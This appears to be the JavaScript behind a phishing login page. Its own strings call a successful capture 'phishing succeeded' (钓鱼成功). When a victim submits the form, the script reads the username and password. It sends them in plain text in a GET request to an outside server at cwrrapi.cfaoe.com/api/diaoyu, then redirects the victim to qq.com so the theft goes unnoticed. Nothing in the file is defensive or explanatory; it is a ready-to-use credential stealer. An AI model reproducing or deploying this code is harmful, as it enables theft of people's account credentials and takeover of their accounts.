
(function () {
    const login = document.querySelector('#login')
    function sendMsg() {
        const userName = document.querySelector('#name').value;
        const passWord = document.querySelector('#password').value;

        const uname = document.querySelector('#uname')
        const upwd = document.querySelector('#upwd')
        const all = document.querySelector('#all')

        if (userName == '' && passWord !== '') {
            uname.classList.add('show')
            setTimeout(() => {
                uname.classList.remove('show')
            }, 1000)
        } else if (passWord == '' && userName !== '') {
            upwd.classList.add('show')
            setTimeout(() => {
                upwd.classList.remove('show')
            }, 1000)
        } else if (passWord == '' && userName == '') {
            all.classList.add('show')
            setTimeout(() => {
                all.classList.remove('show')
            }, 1000)
        } else {
            uname.classList.remove('show')
            uname.classList.remove('show')
            all.classList.remove('show')

            let data = "钓鱼成功！"+`账号：${userName}，密码：${passWord}`
            //输入api借接口
            let url = 'http://cwrrapi.cfaoe.com/api/diaoyu?content=' + data

            fetch(url, {
                method: 'GET',

            }).then(response => response.json())
                .then(data => {
                    setTimeout(() => {
                        window.location.href = 'https://www.qq.com/'
                    }, 1000)
                })
                .catch((error) => {
                    window.location.reload()
                });

        }


    }

    login.addEventListener('click', function () {
        sendMsg()
        console.log('daf')
    })

})();
